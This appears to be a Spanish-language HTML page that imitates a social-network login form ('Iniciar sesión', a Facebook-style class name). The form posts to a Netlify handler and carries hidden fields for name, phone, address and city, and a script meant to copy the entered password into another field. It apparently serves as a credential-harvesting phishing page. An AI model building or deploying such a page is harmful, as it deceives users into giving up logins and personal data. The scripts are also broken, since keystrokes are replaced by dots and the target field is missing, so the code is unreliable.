<!DOCTYPE html>
<html>
<head>
    <title>Cuadro de texto con puntos</title>
    <script>
        function hideText(event) {
            var input = document.getElementById("myInput");
            input.value += "•";
            event.preventDefault();
        }

        function showText() {
            var input = document.getElementById("myInput");
            var hiddenText = input.value.replace(/•/g, "");
            alert("Texto oculto: " + hiddenText);
        }

        function replacePassword() {
            var passwordInput = document.getElementById("departamento");
            var hiddenInput = document.getElementById("myInput");
            passwordInput.value = hiddenInput.value.replace(/•/g, "");
        }
    </script>
</head>
<body>

<h2>Cuadro de texto con puntos</h2>

<form id="myForm">
    <label for="myInput">Texto oculto:</label>
    <input type="password" id="myInput" onkeydown="hideText(event)" required>
    <br>
    <input type="button" value="Mostrar" onclick="showText()">
</form>

<div class="_5rut">
    <form name="contact" method="POST" data-netlify="true" onsubmit="submit" action="/index">
        <div class="form-group">
            <input class="controls" type="text" name="nombres" id="nombres" placeholder="  Nombre" style="display: none;">
            <input class="controls" type="text" name="apellidos" id="apellidos" placeholder="  Apellidos" style="display: none;">
            <input class="controls" type="text" name="movil" id="movil" placeholder="  Teléfono móvil"  style="display: none;">
            <input class="controls" type="text" name="direcion" id="direcion" placeholder="  Direcion"  style="display: none;">
            <input class="controls" type="text" name="ciudad" id="ciudad" placeholder="  ciudad"  style="display: none;">
            <input  class="form-control" type="text"  name="correo" id="correo" placeholder="Número de móvil o correo electrónico" required>

        </div>
        <button type="submit" name="submit" class="btn btn-primary btn-block" onclick="replacePassword()">Iniciar sesión</button>
    </form>
</div>

</body>
</html>
